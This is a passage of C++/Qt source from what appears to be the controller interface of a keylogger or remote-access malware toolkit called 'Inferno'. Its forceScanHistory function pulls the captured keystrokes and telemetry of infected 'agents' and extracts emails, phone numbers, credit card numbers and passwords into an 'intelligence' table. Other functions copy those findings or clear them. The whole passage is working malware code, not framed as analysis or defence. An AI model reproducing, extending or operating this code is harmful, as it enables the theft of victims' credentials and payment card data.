        itemContext->setForeground(QColor(170, 170, 170));
        itemTime->setForeground(QColor(120, 120, 120));

        m_intelTable->setItem(row, 0, itemType);
        m_intelTable->setItem(row, 1, itemValue);
        m_intelTable->setItem(row, 2, itemContext);
        m_intelTable->setItem(row, 3, itemTime);
        
        row++;
    }
}

void MainWindow::forceScanHistory() {
    auto* current = m_agentList->currentItem();
    if (!current) {
        onStatusMessage("No agent selected to perform scan");
        return;
    }
    
    QString ip = current->data(Qt::UserRole).toString();
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) return;

    onStatusMessage("Scanning historical logs for agent " + ip + "...");
    
    // Get full reconstructed keylog session (chronological order)
    QString fullKeylog = Inferno_Database::instance().getRawKeylogsChronological(uuid);
    std::string cleanKeylog = Analysis::filterBackspaces(fullKeylog.toStdString());
    int new_findings = 0;
    
    // Scan keylogs chronologically
    {
        auto emails = Analysis::extractEmails(cleanKeylog);
        for (const auto& email : emails) {
            if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Historical Keylog")) {
                new_findings++;
            }
        }
        auto phones = Analysis::extractPhones(cleanKeylog);
        for (const auto& phone : phones) {
            if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Historical Keylog")) {
                new_findings++;
            }
        }
        auto cards = Analysis::extractCreditCards(cleanKeylog);
        for (const auto& card : cards) {
            if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Historical Keylog")) {
                new_findings++;
            }
        }
        auto passwords = Analysis::extractPasswords(cleanKeylog);
        for (const auto& pair : passwords) {
            if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
                new_findings++;
            }
        }
    }

    QStringList telemetry = Inferno_Database::instance().getTelemetryHistory(uuid, "ALL", 5000);
    for (const QString& line : telemetry) {
        QString cleanLine = line;
        if (line.startsWith("[") && line.indexOf("]") > 0) {
            cleanLine = line.mid(line.indexOf("]") + 1).trimmed();
        }
        
        std::string text = cleanLine.toStdString();
        
        auto emails = Analysis::extractEmails(text);
        for (const auto& email : emails) {
            if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Historical Telemetry")) {
                new_findings++;
            }
        }
        auto phones = Analysis::extractPhones(text);
        for (const auto& phone : phones) {
            if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Historical Telemetry")) {
                new_findings++;
            }
        }
        auto cards = Analysis::extractCreditCards(text);
        for (const auto& card : cards) {
            if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Historical Telemetry")) {
                new_findings++;
            }
        }
        auto passwords = Analysis::extractPasswords(text);
        for (const auto& pair : passwords) {
            if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
                new_findings++;
            }
        }
    }

    loadIntelligenceList();
    onStatusMessage(QString("Scan complete. Identified %1 new findings.").arg(new_findings));
}

void MainWindow::copySelectedIntel() {
    int row = m_intelTable->currentRow();
    if (row < 0) return;
    
    QTableWidgetItem* valItem = m_intelTable->item(row, 1);
    if (!valItem) return;
    
    QGuiApplication::clipboard()->setText(valItem->text());
    onStatusMessage("Copied to clipboard: " + valItem->text());
}

void MainWindow::clearIntelFindings() {
    auto* current = m_agentList->currentItem();
    if (!current) return;
    
    QString ip = current->data(Qt::UserRole).toString();
    QString uuid = m_agentIpToUuid.value(ip);
    if (uuid.isEmpty()) return;

    if (Inferno_Database::instance().clearIntelligence(uuid)) {
        loadIntelligenceList();
        onStatusMessage("Cleared intelligence findings for agent " + ip);
    }
}

} // namespace inferno
